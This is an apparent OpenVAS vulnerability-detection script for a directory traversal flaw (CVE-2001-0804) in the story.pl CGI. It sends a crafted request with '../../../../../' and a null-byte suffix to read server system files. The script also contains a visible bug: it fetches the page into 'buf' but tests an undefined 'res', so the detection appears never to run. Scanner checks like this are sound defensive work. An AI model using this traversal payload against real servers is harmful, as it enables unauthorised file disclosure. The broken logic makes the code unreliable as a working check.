# SPDX-FileCopyrightText: 2001 Alert4Web.com
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10817");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2001-0804");
  script_name("Interactive Story (story.pl) < 1.4 Directory Traversal Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2001 Alert4Web.com");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210226101439/http://www.securityfocus.com/bid/3028");

  script_tag(name:"summary", value:"Interactive Story (story.pl) is prone to a directory traversal
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"An attacker may use this flaw to read arbitrary files on
  this server.");

  script_tag(name:"affected", value:"Interactive Story (story.pl) version 1.3 is known to be
  affected. Older versions might be affected as well.");

  script_tag(name:"solution", value:"Update to version 1.4 or later.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );

files = traversal_files();

foreach dir( make_list_unique( "/", "/cgi-bin", "/story", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" )
    dir = "";

  buf = http_get_cache( item:dir + "/story.pl", port:port );
  # Pattern taken from the body of https://web.archive.org/web/20010804092034/http://www.valeriemates.com/cgi-bin/cgiwrap/valerie/story.pl
  if( ! res || ">Story program written by" >!< res )
    continue;

  foreach file( keys( files ) ) {

    url = dir + "/story.pl?next=../../../../../" + files[file] + "%00";
    req = http_get( item:url, port:port );
    buf = http_keepalive_send_recv( port:port, data:req );

    if( egrep( pattern:file, string:buf ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }

  url = dir + "/story.pl?next=about";
  req = http_get( item:url, port:port );
  buf = http_keepalive_send_recv( port:port, data:req );

  if( egrep( pattern:"This is version 1\.[0-3] of the story program", string:buf ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
